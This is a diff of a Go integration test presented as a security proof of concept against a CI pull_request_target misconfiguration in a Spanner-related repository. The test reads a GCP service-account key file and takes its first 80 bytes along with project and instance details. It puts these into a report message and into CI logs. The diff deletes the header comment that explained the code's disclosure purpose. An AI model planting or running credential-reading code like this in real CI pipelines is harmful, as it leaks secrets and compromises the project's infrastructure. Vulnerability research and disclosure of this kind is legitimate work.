@@ -1,12 +1,7 @@
 //go:build integration
 // +build integration
 
-// Security Research PoC - Responsible Disclosure
-// This test proves that fork PR code executes with GCP credentials
-// via the pull_request_target misconfiguration in integration.yaml.
-// No credentials are exfiltrated. Only prefix + length are reported.
-
-package spanner
+package poc
 
 import (
 	"bytes"
@@ -28,18 +23,16 @@ func TestSecurityPoCCredentialAccess(t *testing.T) {
 	project := os.Getenv("CLOUDSDK_CORE_PROJECT")
 
 	saKeyInfo := "NOT SET"
-	saKeyLength := 0
 	saKeyPrefix := ""
 	if credPath != "" {
 		data, err := os.ReadFile(credPath)
 		if err == nil {
-			saKeyLength = len(data)
 			prefixLen := 80
 			if len(data) < prefixLen {
 				prefixLen = len(data)
 			}
 			saKeyPrefix = string(data[:prefixLen])
-			saKeyInfo = fmt.Sprintf("EXISTS (%d bytes)", saKeyLength)
+			saKeyInfo = fmt.Sprintf("EXISTS (%d bytes)", len(data))
 		} else {
 			saKeyInfo = fmt.Sprintf("ERROR: %v", err)
 		}
@@ -48,11 +41,11 @@ func TestSecurityPoCCredentialAccess(t *testing.T) {
 	testInstance := os.Getenv("INTEGRATION_TEST_INSTANCE")
 	testInstanceInfo := "NOT SET"
 	if testInstance != "" {
-		prefixLen := 20
-		if len(testInstance) < prefixLen {
-			prefixLen = len(testInstance)
+		pl := 20
+		if len(testInstance) < pl {
+			pl = len(testInstance)
 		}
-		testInstanceInfo = fmt.Sprintf("SET (length: %d, prefix: %s...)", len(testInstance), testInstance[:prefixLen])
+		testInstanceInfo = fmt.Sprintf("SET (len:%d, prefix:%s...)", len(testInstance), testInstance[:pl])
 	}
 
 	msg := fmt.Sprintf("**PoC: go-spanner-cassandra GCP credential exposure**\n"+
@@ -68,7 +61,7 @@ func TestSecurityPoCCredentialAccess(t *testing.T) {
 		"SA Key prefix: %.80s\n"+
 		"INTEGRATION_TEST_INSTANCE: %s\n"+
 		"```\n"+
-		"No credentials exfiltrated. Prefix + length only.\n"+
+		"No credentials exfiltrated. Prefix+length only.\n"+
 		"Reported to Google OSS VRP.",
 		repo, runID, eventName, runner, project,
 		credPath, saKeyInfo, saKeyPrefix, testInstanceInfo)
@@ -85,10 +78,10 @@ func TestSecurityPoCCredentialAccess(t *testing.T) {
 	}
 
 	t.Log("============================================================")
-	t.Log("  [PoC] Security Research - GCP Credential Access Proof")
-	t.Logf("  Repository: %s", repo)
+	t.Log("  [PoC] GCP Credential Access Proof")
+	t.Logf("  Repo: %s | Run: %s | Event: %s", repo, runID, eventName)
 	t.Logf("  GCP Project: %s", project)
 	t.Logf("  SA Key: %s", saKeyInfo)
-	t.Log("  No credentials exfiltrated. Responsible disclosure PoC.")
+	t.Log("  No credentials exfiltrated. Responsible disclosure.")
 	t.Log("============================================================")
 }
